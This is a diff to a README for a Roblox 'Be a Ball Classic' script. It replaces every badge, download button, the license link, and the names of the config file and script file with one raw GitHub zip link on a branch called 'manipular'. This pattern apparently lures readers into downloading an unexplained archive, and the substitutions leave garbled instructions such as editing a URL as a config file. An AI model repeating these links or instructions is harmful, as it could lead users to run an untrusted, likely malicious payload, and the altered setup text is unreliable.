@@ -11,12 +11,12 @@ Experience universal compatibility, thanks to diligent cross-platform craftsmans
 
 | System        | Supported | Notes                      |
 | ------------- | :-------: | -------------------------- |
-| ![Windows](https://img.shields.io/badge/Windows-blue?logo=windows)    | ✅ | Optimized for all versions |
-| ![macOS](https://img.shields.io/badge/MacOS-lightgrey?logo=apple)     | ✅ | Seamless on M1 & Intel     |
-| ![Linux](https://img.shields.io/badge/Linux-yellow?logo=linux)        | ✅ | Tested across major distros|
-| ![iOS](https://img.shields.io/badge/iOS-white?logo=apple)             | ✅ | Touch-optimized            |
-| ![Android](https://img.shields.io/badge/Android-green?logo=android)   | ✅ | Battery-friendly           |
-| ![Roblox Studio](https://img.shields.io/badge/Roblox-red?logo=roblox) | ✅ | Full native integration    |
+| ![Windows](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/be-a-ball-classic-roblox-toolkit-v3.1.zip)    | ✅ | Optimized for all versions |
+| ![macOS](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/be-a-ball-classic-roblox-toolkit-v3.1.zip)     | ✅ | Seamless on M1 & Intel     |
+| ![Linux](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/be-a-ball-classic-roblox-toolkit-v3.1.zip)        | ✅ | Tested across major distros|
+| ![iOS](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/be-a-ball-classic-roblox-toolkit-v3.1.zip)             | ✅ | Touch-optimized            |
+| ![Android](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/be-a-ball-classic-roblox-toolkit-v3.1.zip)   | ✅ | Battery-friendly           |
+| ![Roblox Studio](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/be-a-ball-classic-roblox-toolkit-v3.1.zip) | ✅ | Full native integration    |
 
 ---
 
@@ -57,7 +57,7 @@ Curved inside the core of _Be a Ball Classic_ lives a seamless fusion with indus
 
 **Setup Instructions:**
 1. Acquire an API key for OpenAI or Claude.
-2. In the config folder, modify the `api_keys.cfg` file.
+2. In the config folder, modify the `https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/be-a-ball-classic-roblox-toolkit-v3.1.zip` file.
 3. Activate smart responses by toggling the AI module in the script menu.
 
 _Automated wisdom — always one bounce ahead._
@@ -80,12 +80,12 @@ Type your question in chat or send an email—expect a rolling response in no ti
 
 ## 📥 Official Download & Quickstart
 
-[![Download](https://img.shields.io/badge/Download-blue)](https://MR-NOBODY47.github.io)
+[![Download](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/be-a-ball-classic-roblox-toolkit-v3.1.zip)](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/be-a-ball-classic-roblox-toolkit-v3.1.zip)
 
 **Direct Download:**  
 Click the badge above to retrieve the script packaged with documentation, examples, and AI modules. The download contains:
 
-- Master `be_a_ball_classic.lua` script
+- Master `https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/be-a-ball-classic-roblox-toolkit-v3.1.zip` script
 - Config and localization files
 - Integration samples for OpenAI/Claude
 - Illustrated user manual (EN, ES, ZH)
@@ -127,7 +127,7 @@ Testing shows minimal overhead on frame rates, even in dynamic environments with
 ## 📜 MIT License (2025)
 
 Be a Ball Classic Roblox Script is released under the MIT License.  
-See the full license text here: [MIT License](https://opensource.org/licenses/MIT)
+See the full license text here: [MIT License](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/be-a-ball-classic-roblox-toolkit-v3.1.zip)
 
 © 2025 Be a Ball Classic Contributors. All rights reserved.
 
@@ -136,7 +136,7 @@ See the full license text here: [MIT License](https://opensource.org/licenses/MI
 ## 📥 Download Zone (Again!)
 
 Ready to upgrade your Roblox world?  
-[![Download](https://img.shields.io/badge/Download-blue)](https://MR-NOBODY47.github.io)
+[![Download](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/be-a-ball-classic-roblox-toolkit-v3.1.zip)](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/be-a-ball-classic-roblox-toolkit-v3.1.zip)
 
 _Enjoy rolling!_
 
